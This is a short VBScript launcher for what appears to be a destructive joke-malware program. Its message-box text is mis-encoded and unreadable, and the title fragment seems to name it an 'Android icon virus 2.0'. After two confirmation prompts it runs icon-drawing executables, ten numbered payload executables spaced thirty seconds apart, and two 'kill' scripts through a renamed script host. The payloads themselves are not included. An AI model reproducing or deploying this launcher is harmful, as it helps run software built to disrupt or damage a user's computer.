X = MsgBox("���棡�˳���Ϊ���Բ��������ܻ�ʹ��ĵ����޷������������Ƿ����У�"&vbcr&""&vbcr&"�벻Ҫ�������˵ĵ��Ի��õ����϶���򿪴˳���������ǲ�С�Ĵ򿪵ģ��������񡱰�ťȡ�����С����Ҫ���У���ȷ���������Լ��ĵ��������еģ���ȷ���˵��Բ����Ѿ��ڰ�ȫ�Ļ��������������ɳ�еȣ��в��ر�����ɱ���������������������˵ĵ��Ի��õ��������еĴ˳�����ȷ�������е��Ǵ˳�����޺��汾��Ȼ�������ǡ���ť������",52,"��׿ͼ�겡�� 2.0 (��ʽ�汾)")
If X = vbYes Then
Y = MsgBox("�������ľ��棡����"&vbcr&""&vbcr&"�����Ҫ���������к���ĵ��Կ��ܻ��޷�����������������������˵ĵ��Ի��õ��������д˳�����к��汾����ô����Ҫ�е����д˳�������ɵ���ʧ�Լ���Ӧ�������Σ��˵��Բ������߲��������Σ�����",52,"��׿ͼ�겡�� 2.0 (��ʽ�汾)")
If Y = vbYes Then
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawxugeicon.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawandroidicon.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload1android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload2android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload3android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload4android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload5android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload6android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload7android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload8android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload9android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("payload10android.exe")
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe kill1.vbs")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe kill2.vbs")
else
End If
else
End If